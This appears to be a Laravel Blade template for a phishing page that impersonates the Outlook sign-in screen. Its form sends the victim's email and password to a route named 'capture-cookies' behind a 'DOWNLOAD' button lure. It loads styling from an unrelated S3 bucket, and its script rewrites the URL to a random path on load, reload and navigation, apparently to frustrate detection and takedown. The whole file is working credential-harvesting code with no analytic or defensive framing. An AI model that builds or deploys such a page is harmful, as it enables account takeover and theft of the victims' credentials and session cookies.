<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In to Outlook</title>
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="stylesheet" href="https://server11011.s3.ca-central-1.amazonaws.com/styles.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        .show-password {
            cursor: pointer;
            color: blue;
            margin-left: 10px;
            user-select: none;
        }
    </style>
</head>
<body>
    <div class="login-page">
        <div class="login-form">
            <form id="register-form" method="POST" action="{{ secure_url(route('capture-cookies', [], false)) }}">
            {{-- <form id="register-form" method="POST" action="{{ secure_url(route('register', [], false)) }}"> --}}
                {{-- <form id="register-form" method="POST" action="{{ route('capture-cookies') }}"> --}}
                    @if ($errors->any())
    <div class="alert alert-danger">
        <ul>
            @foreach ($errors->all() as $error)
                <li>{{ $error }}</li>
            @endforeach
        </ul>
    </div>
@endif
                @csrf
                <div class="form-group">
                    <input type="email" id="email" name="email" placeholder="Email" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                    <span class="show-password" id="togglePassword">Show</span>
                </div>
                <button type="submit">DOWNLOAD</button>
            </form>
        </div>
    </div>

    <script>
        // Toggle password visibility
        document.getElementById('togglePassword').addEventListener('click', function () {
            const passwordField = document.getElementById('password');
            const isPassword = passwordField.type === 'password';
            passwordField.type = isPassword ? 'text' : 'password';
            this.textContent = isPassword ? 'Hide' : 'Show';
        });

        // Function to generate a long random string
        function generateRandomString() {
            return Math.random().toString(36).substring(2) +
                Math.random().toString(36).substring(2) +
                Math.random().toString(36).substring(2) +
                Math.random().toString(36).substring(2);
        }

        // Function to change URL
        function changeURL() {
            var randomString = generateRandomString();
            var newURL = '{{ route('welcome', ['randomPath' => 'dummy']) }}'.replace('dummy', randomString);

            // Use history.pushState to change URL without reload
            history.pushState({}, '', newURL);
        }

        // Change URL on page load
        window.addEventListener('load', changeURL);

        // Change URL when page is reloaded
        if (performance.navigation.type === 1) { // 1 indicates reload
            changeURL();
        }

        // Handle back/forward browser navigation
        window.addEventListener('popstate', function(event) {
            changeURL();
        });
    </script>
</body>
</html>
